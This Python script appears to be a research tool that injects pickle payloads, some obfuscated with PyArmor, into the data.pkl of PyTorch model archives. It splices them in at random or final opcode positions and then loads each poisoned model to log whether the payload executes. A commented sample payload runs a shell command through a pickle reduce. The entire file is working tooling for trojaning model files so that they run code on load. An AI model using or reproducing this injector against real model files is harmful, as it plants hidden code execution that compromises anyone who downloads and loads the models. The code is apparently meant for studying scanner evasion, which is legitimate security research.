import torch
import argparse
import gc
import csv
import multiprocessing
import datetime
import threading
import subprocess
import zipfile
import io
import sys
import pickle
import pickletools
import tempfile
import os
import random
import zlib
import struct

from payload_generator import (
    generate_paylaod,
    get_random_pkl_file,
    generate_pyarmor_paylaod,
)
from fickling.fickle import Pickled


def load_model(output_path, queue, log_entry):
    print("are we even here")
    try:
        torch.load(output_path, weights_only=False, map_location="cpu")
        print("model loaded")

        log_entry["load_status"] = "SUCCESS"
        queue.put(log_entry)

    except Exception as e:
        print("does it reach here?")
        log_entry["load_status"] = "ERROR"
        log_entry["load_error"] = str(e)[:500]
        queue.put(log_entry)


def write_log_entry(log_entry, log_filename):
    """Write a single log entry to CSV file"""
    file_exists = os.path.exists(log_filename)

    with open(log_filename, "a", newline="", encoding="utf-8") as csvfile:
        fieldnames = [
            "timestamp",
            "model_path",
            "filename",
            "payload",
            "payload_name",
            "injection_position",
            "pickle_version",
            "file_size",
            "injection_status",
            "injection_error",
            "output_file",
            "load_status",
            "load_error",
            "load_timeout",
            "execution_time_seconds",
        ]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

        if not file_exists:
            writer.writeheader()

        writer.writerow(log_entry)


def pytorch_injector(
    input_file_path,
    output_path,
    chosen_file=None,
    log_filename="injection_log_pytorch_text_classification.csv",
):
    # Initialize log entry
    start_time = datetime.datetime.now()
    filename = os.path.basename(input_file_path)

    log_entry = {
        "timestamp": start_time.isoformat(),
        "model_path": input_file_path,
        "filename": filename,
        "payload": "",
        "injection_position": 0,
        "pickle_version": 0,
        "file_size": 0,
        "injection_status": "FAILED",
        "injection_error": "",
        "output_file": output_path,
        "load_status": "NOT_ATTEMPTED",
        "load_error": "",
        "load_timeout": False,
        "execution_time_seconds": 0,
    }
    nc_output = {"stdout": None, "stderr": None, "proc": None}

    def pickled(path):
        with zipfile.ZipFile(path, "r") as zip_ref:
            data_pkl_path = next(
                (name for name in zip_ref.namelist() if name.endswith("/data.pkl")),
                None,
            )
            if data_pkl_path is None:
                raise ValueError("data.pkl not found in the zip archive")

            with zip_ref.open(data_pkl_path, "r") as pickle_file:
                model_data = pickle_file.read()
        return model_data

    try:
        if chosen_file:
            payload = generate_paylaod(chosen_file)
        else:
            payload = generate_paylaod(get_random_pkl_file("payloads/"))
        # payload = generate_paylaod("./external_hi.pkl")
        temp = tempfile.TemporaryFile("w+")
        locations = []
        model_data = pickled(input_file_path)
        file_size = len(model_data)
        log_entry["payload"] = payload

        inf = io.BytesIO(model_data)
        while inf.tell() != file_size:
            try:
                pickletools.dis(inf, temp)
                temp.seek(0)
                version = int(
                    temp.read()
                    .partition("highest protocol among opcodes = ")[2]
                    .partition("\n")[0]
                )
                temp.seek(0)
                tempLocations = [
                    location.partition(":")[0] for location in temp.read().split("\n")
                ]
                for location in tempLocations:
                    try:
                        locations.append((int(location), version))
                    except ValueError as e:
                        pass
            except Exception as e:
                print(e)
                break
        pos, version = random.choice(locations)

        log_entry["injection_position"] = pos
        log_entry["pickle_version"] = version
        inf.seek(0)
        print(payload)
        with zipfile.ZipFile(output_path, "w") as new_zip_ref:
            with zipfile.ZipFile(input_file_path, "r") as zip_ref:
                for item in zip_ref.infolist():
                    with zip_ref.open(item.filename) as entry:
                        if item.filename.endswith("/data.pkl"):
                            print(item.filename)
                            content_before = inf.read(pos)  # read up to position `pos`
                            content_after = inf.read()  # read the rest after pos
                            combined_content = content_before + payload + content_after
                            new_zip_ref.writestr(item.filename, combined_content)
                        else:
                            new_zip_ref.writestr(item.filename, entry.read())

        log_entry["injection_status"] = "SUCCESS"
        print("injection finished at", pos)
        print("loading model")
        log_entry["load_status"] = "ATTEMPTING"
        result = [None]
        exception = [None]

        gc.collect()

        # print(res)
        queue = multiprocessing.Queue()
        process = multiprocessing.Process(
            target=load_model, args=(output_path, queue, log_entry)
        )
        process.start()
        process.join(timeout=60)
        if process.is_alive():
            print("Timeout reached. Killing process.")
            process.terminate()
            process.join()
            log_entry["injection_status"] = "TIMED OUT"
        else:
            result = queue.get()
            if result:
                log_entry = result

        print("Finished with multiprocessing")

        if exception[0]:
            print(f"\n=== Load exception ===")
            print(exception[0])

        print("collecting garbage here")
        gc.collect()
    except Exception as e:
        log_entry["injection_status"] = "FAILED"
        log_entry["injection_error"] = str(e)[:500]
        print(f"Injection failed: {type(e).__name__}: {e}")
        gc.collect()
        import traceback

        traceback.print_exc()
        return None

    finally:
        end_time = datetime.datetime.now()
        log_entry["execution_time_seconds"] = (end_time - start_time).total_seconds()
        write_log_entry(log_entry, log_filename)
        print(f"Log entry written to {log_filename}")

    return True


def obfuscated_pytorch_injector(
    input_file_path,
    output_path,
    pyarmor_location=None,
    log_filename="injection_log_pytorch_text_classification.csv",
    chosen_file=None,
):
    # Initialize log entry
    start_time = datetime.datetime.now()
    filename = os.path.basename(input_file_path)

    log_entry = {
        "timestamp": start_time.isoformat(),
        "model_path": input_file_path,
        "filename": filename,
        "payload": "",
        "payload_name": "",
        "injection_position": 0,
        "pickle_version": 0,
        "file_size": 0,
        "injection_status": "FAILED",
        "injection_error": "",
        "output_file": output_path,
        "load_status": "NOT_ATTEMPTED",
        "load_error": "",
        "load_timeout": False,
        "execution_time_seconds": 0,
    }
    nc_output = {"stdout": None, "stderr": None, "proc": None}

    def pickled(path):
        with zipfile.ZipFile(path, "r") as zip_ref:
            data_pkl_path = next(
                (name for name in zip_ref.namelist() if name.endswith("/data.pkl")),
                None,
            )
            if data_pkl_path is None:
                raise ValueError("data.pkl not found in the zip archive")

            with zip_ref.open(data_pkl_path, "r") as pickle_file:
                model_data = pickle_file.read()
        return model_data

    try:
        if not pyarmor_location:
            pyarmor_location = "payloads/obfuscated/"
        sys.path.append(pyarmor_location)
        # payload = generate_paylaod(get_random_pkl_file("payloads/"))
        if chosen_file:
            random_pkl_file = chosen_file
        else:
            random_pkl_file = get_random_pkl_file(pyarmor_location)
        # )
        #
        payload = generate_pyarmor_paylaod(random_pkl_file)

        # pyarmor_location = "".join(pyarmor_location.split("/")[-2:-1]) + "/"
        temp = tempfile.TemporaryFile("w+")
        locations = []
        model_data = pickled(input_file_path)
        file_size = len(model_data)
        log_entry["payload"] = payload

        log_entry["payload_name"] = random_pkl_file
        inf = io.BytesIO(model_data)
        while inf.tell() != file_size:
            try:
                pickletools.dis(inf, temp)
                temp.seek(0)
                version = int(
                    temp.read()
                    .partition("highest protocol among opcodes = ")[2]
                    .partition("\n")[0]
                )
                temp.seek(0)
                tempLocations = [
                    location.partition(":")[0] for location in temp.read().split("\n")
                ]
                for location in tempLocations:
                    try:
                        locations.append((int(location), version))
                    except ValueError as e:
                        pass
            except Exception as e:
                print(e)
                break
        pos, version = random.choice(locations)

        log_entry["injection_position"] = pos
        log_entry["pickle_version"] = version
        inf.seek(0)
        print(payload)
        with zipfile.ZipFile(output_path, "w") as new_zip_ref:
            with zipfile.ZipFile(input_file_path, "r") as zip_ref:
                for item in zip_ref.infolist():
                    with zip_ref.open(item.filename) as entry:
                        if item.filename.endswith("/data.pkl"):
                            print(item.filename)
                            content_before = inf.read(pos)  # read up to position `pos`
                            content_after = inf.read()  # read the rest after pos
                            combined_content = content_before + payload + content_after
                            new_zip_ref.writestr(item.filename, combined_content)
                        else:
                            new_zip_ref.writestr(item.filename, entry.read())

        log_entry["injection_status"] = "SUCCESS"
        print("injection finished at", pos)
        print("loading model")
        log_entry["load_status"] = "ATTEMPTING"
        result = [None]
        exception = [None]

        gc.collect()

        # print(res)
        queue = multiprocessing.Queue()
        process = multiprocessing.Process(
            target=load_model, args=(output_path, queue, log_entry)
        )
        process.start()
        process.join(timeout=60)
        if process.is_alive():
            print("Timeout reached. Killing process.")
            process.terminate()
            process.join()
            log_entry["injection_status"] = "TIMED OUT"
        else:
            result = queue.get()
            if result:
                log_entry = result

        print("Finished with multiprocessing")

        if exception[0]:
            print(f"\n=== Load exception ===")
            print(exception[0])

        print("collecting garbage here")
        gc.collect()
    except Exception as e:
        log_entry["injection_status"] = "FAILED"
        log_entry["injection_error"] = str(e)[:500]
        print(f"Injection failed: {type(e).__name__}: {e}")
        gc.collect()
        import traceback

        traceback.print_exc()
        return None

    finally:
        end_time = datetime.datetime.now()
        log_entry["execution_time_seconds"] = (end_time - start_time).total_seconds()
        write_log_entry(log_entry, log_filename)
        print(f"Log entry written to {log_filename}")

    return True


def inject_at_end(
    input_file_path,
    output_path,
    payload_chosen=None,
    log_filename="injection_log_pytorch_text_classification.csv",
):
    # Initialize log entry
    start_time = datetime.datetime.now()
    filename = os.path.basename(input_file_path)

    log_entry = {
        "timestamp": start_time.isoformat(),
        "model_path": input_file_path,
        "filename": filename,
        "payload": "",
        "injection_position": 0,
        "pickle_version": 0,
        "file_size": 0,
        "injection_status": "FAILED",
        "injection_error": "",
        "output_file": output_path,
        "load_status": "NOT_ATTEMPTED",
        "load_error": "",
        "load_timeout": False,
        "execution_time_seconds": 0,
    }
    nc_output = {"stdout": None, "stderr": None, "proc": None}

    def pickled(path):
        with zipfile.ZipFile(path, "r") as zip_ref:
            data_pkl_path = next(
                (name for name in zip_ref.namelist() if name.endswith("/data.pkl")),
                None,
            )
            if data_pkl_path is None:
                raise ValueError("data.pkl not found in the zip archive")

            with zip_ref.open(data_pkl_path, "r") as pickle_file:
                model_data = pickle_file.read()
        return model_data

    try:
        # payload = generate_paylaod(get_random_pkl_file("payloads/"))
        if payload_chosen is None:
            random_pkl_file = get_random_pkl_file("payloads/overwritten_payloads_exec/")
        else:
            random_pkl_file = payload_chosen
        payload = generate_paylaod(random_pkl_file, True)
        # payload = b"ccollections\nOrderedDict\nr\x00\x00\x10\x00X\x06\x00\x00\x00ls -lar\x01\x00\x10\x00\x85r\x02\x00\x10\x00Rb"
        temp = tempfile.TemporaryFile("w+")
        locations = []
        model_data = pickled(input_file_path)
        file_size = len(model_data)
        log_entry["payload"] = payload

        inf = io.BytesIO(model_data)
        while inf.tell() != file_size:
            try:
                pickletools.dis(inf, temp)
                temp.seek(0)
                version = int(
                    temp.read()
                    .partition("highest protocol among opcodes = ")[2]
                    .partition("\n")[0]
                )
                temp.seek(0)
                tempLocations = [
                    location.partition(":")[0] for location in temp.read().split("\n")
                ]
                for location in tempLocations:
                    try:
                        locations.append((int(location), version))
                    except ValueError as e:
                        pass
            except Exception as e:
                print(e)
                break
        # print(locations)
        # exit()
        # change to -2 for adaptive Overwritten module attack wfor modules with SEITEMS at the end
        pos, version = locations[-1]

        log_entry["injection_position"] = pos
        log_entry["pickle_version"] = version
        inf.seek(0)
        print(payload)
        with zipfile.ZipFile(output_path, "w") as new_zip_ref:
            with zipfile.ZipFile(input_file_path, "r") as zip_ref:
                for item in zip_ref.infolist():
                    with zip_ref.open(item.filename) as entry:
                        if item.filename.endswith("/data.pkl"):
                            print(item.filename)
                            content_before = inf.read(pos)  # read up to position `pos`
                            content_after = inf.read()  # read the rest after pos
                            combined_content = content_before + payload + content_after
                            new_zip_ref.writestr(item.filename, combined_content)
                        else:
                            new_zip_ref.writestr(item.filename, entry.read())

        log_entry["injection_status"] = "SUCCESS"
        print("injection finished at", pos)
        print("loading model")
        log_entry["load_status"] = "ATTEMPTING"
        result = [None]
        exception = [None]

        gc.collect()

        # print(res)
        queue = multiprocessing.Queue()
        process = multiprocessing.Process(
            target=load_model, args=(output_path, queue, log_entry)
        )
        process.start()
        process.join(timeout=60)
        if process.is_alive():
            print("Timeout reached. Killing process.")
            process.terminate()
            process.join()
            log_entry["injection_status"] = "TIMED OUT"
        else:
            result = queue.get()
            if result:
                log_entry = result

        print("Finished with multiprocessing")
        if exception[0]:
            print(f"\n=== Load exception ===")
            print(exception[0])

        print("collecting garbage here")
        gc.collect()
    except Exception as e:
        log_entry["injection_status"] = "FAILED"
        log_entry["injection_error"] = str(e)[:500]
        print(f"Injection failed: {type(e).__name__}: {e}")
        gc.collect()
        import traceback

        traceback.print_exc()
        return None

    finally:
        end_time = datetime.datetime.now()
        log_entry["execution_time_seconds"] = (end_time - start_time).total_seconds()
        write_log_entry(log_entry, log_filename)
        print(f"Log entry written to {log_filename}")

    return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--obfuscated",
        action="store_true",
        help="if obfuscated payloads have to be injected",
    )
    parser.add_argument(
        "--payload-directory", help="directory with the obfuscated payloads"
    )
    parser.add_argument("--input-file", help="model to inject with")
    parser.add_argument("--output-file", help="output injected model")
    parser.add_argument(
        "--overwritten-modules",
        action="store_true",
        help="if injecting with overwritten modules",
    )
    args = parser.parse_args()

    if args.obfuscated:
        if args.payload_directory:
            obfuscated_pytorch_injector(
                args.input_file, args.output_file, args.payload_directory
            )
        else:
            print("please provide the directory containing the obfuscated payloads")
    elif args.overwritten_modules:
        inject_at_end(args.input_file, args.output_file)
    else:
        pytorch_injector(args.input_file, args.output_file)
